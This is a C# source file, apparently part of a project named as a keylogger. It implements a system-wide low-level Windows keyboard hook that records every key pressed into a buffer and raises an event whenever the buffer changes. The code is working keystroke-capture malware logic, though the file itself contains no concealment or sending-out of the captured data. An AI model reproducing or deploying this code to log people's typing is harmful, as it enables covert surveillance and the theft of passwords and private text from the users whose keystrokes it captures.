using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace mth.keylogger
{
    public class KeyboardHook
    {

        // Import DLL
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        // Constants
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_SYSKEYDOWN = 0x0104;
        private LowLevelKeyboardProc _proc = null;
        private IntPtr _hookID = IntPtr.Zero;
        private bool _isHooked = false;
        private static KeyboardHook _instance = null;
        private string _buffer = string.Empty;

        // Event handler to execute on buffer change
        public event EventHandler BufferChanged;

        /// <summary>
        /// Constructor
        /// </summary>
        protected KeyboardHook()
        {
            _proc = HookCallback;
        }

        public static KeyboardHook GetInstance()
        {
            if (_instance == null)
                _instance = new KeyboardHook();
            return _instance;
        }

        /// <summary>
        /// Activa la detección de las pulsaciones
        /// </summary>
        public void Hook()
        {
            _hookID = SetHook(_proc);
            _isHooked = true;
        }

        /// <summary>
        /// Desactiva la detección de las pulsaciones
        /// </summary>
        public void UnHook()
        {
            UnhookWindowsHookEx(_hookID);
            _isHooked = false;
        }

        /// <summary>
        /// Indica si la detección esta activa
        /// </summary>
        public bool IsHooked
        {
            get { return _isHooked; }
        }

        /// <summary>
        /// Resúmen de las teclas pulsadas
        /// </summary>
        public string Buffer
        {
            get { return _buffer; }
        }

        /// <summary>
        /// Evento que se dispara al hacer un cambio en el buffer
        /// </summary>
        /// <param name="e"></param>
        protected virtual void OnBufferChanged(EventArgs e)
        {
            BufferChanged(this, e);
        }

        /// <summary>
        /// Función que agrega la tecla pulsada al buffer
        /// </summary>
        /// <param name="key">Tecla pulsada</param>
        private void AppendBuffer(Keys key)
        {
            _buffer += key + ", ";
            OnBufferChanged(new EventArgs());
        }

        private IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
            {
                int vkCode = Marshal.ReadInt32(lParam);
                AppendBuffer((Keys)vkCode);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
    }
}
